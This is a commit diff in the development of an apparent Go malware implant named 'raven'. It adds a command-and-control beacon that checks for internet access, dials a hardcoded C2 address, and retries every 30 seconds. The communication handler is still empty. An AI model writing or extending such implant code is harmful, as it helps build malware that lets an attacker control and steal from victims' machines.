384fe80258ee459d704889fb9ecbc08b365010ea
Nemuel Wainaina <bR0S3@protonmail.com>
2023-02-25 12:09:08 +0300

    Add function to connect to C2

--- raven.go
+++ raven.go
@@ -2,7 +2,14 @@ package main
 
 import (
 	"fmt"
+	"net"
 	"net/http"
+	"time"
+)
+
+const (
+	HOST = "127.0.0.1"
+	PORT = 12345
 )
 
 func main() {
@@ -12,4 +19,25 @@ func main() {
 func has_internet_access() bool {
 	_, err := http.Get("https://google.com")
 	return err == nil
+}
+
+func c2_comms(conn net.Conn) {
+
+}
+
+func connect_to_c2() {
+	if has_internet_access() {
+		addr := fmt.Sprintf("%s:%d", HOST, PORT)
+		conn, err := net.Dial("tcp", addr)
+		if err != nil {
+			time.Sleep(time.Second * 30)
+			connect_to_c2()
+		} else {
+			// communication with C2
+			c2_comms(conn)
+		}
+	} else {
+		time.Sleep(time.Second * 30)
+		connect_to_c2()
+	}
 }
